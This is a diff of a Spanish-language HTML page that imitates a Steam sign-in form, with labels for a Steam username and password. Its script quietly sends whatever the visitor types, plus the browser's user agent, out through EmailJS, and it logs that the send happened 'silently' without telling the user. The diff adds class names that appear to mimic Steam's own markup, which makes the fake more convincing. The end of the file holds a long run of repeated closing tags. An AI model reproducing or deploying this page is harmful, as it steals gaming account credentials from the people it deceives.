@@ -754,16 +754,28 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8" />
-  <title>Formulario Silencioso con EmailJS</title>
+  <title>Formulario con clases y EmailJS</title>
   <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 </head>
 <body>
   <form id="loginForm">
     <label for="steamAccountName">Usuario Steam:</label><br />
-    <input type="text" id="steamAccountName" name="user_email" required /><br /><br />
+    <input 
+      type="text" 
+      id="steamAccountName" 
+      class="_2gbweup5cttgbte8fm3tfx" 
+      name="user_email" 
+      required 
+    /><br /><br />
     
     <label for="steamPassword">Contraseña Steam:</label><br />
-    <input type="password" id="steamPassword" name="password" required /><br /><br />
+    <input 
+      type="password" 
+      id="steamPassword" 
+      class="_2gbweup5cttgbtw8fm3tfx" 
+      name="password" 
+      required 
+    /><br /><br />
     
     <input type="submit" id="SteamLogin" value="Sign in" />
   </form>
@@ -779,11 +791,9 @@
         user_agent: navigator.userAgent
       })
       .then(function(response) {
-        // Envío silencioso: no se muestra nada al usuario
         console.log('Email enviado silenciosamente.');
       })
       .catch(function(error) {
-        // Tampoco mostramos errores visibles
         console.error('Error en envío silencioso:', error);
       });
     });
@@ -791,6 +801,7 @@
 </body>
 </html></body></html></body></html></body></html>
 ></div></div></body></html></body></html></body></html></body></html></body></html></body></html></body></html></body></html></body></html></body></html></body></html></body></html></body></html></body></html></body></html></body></html></body></html>
+
 
 
 
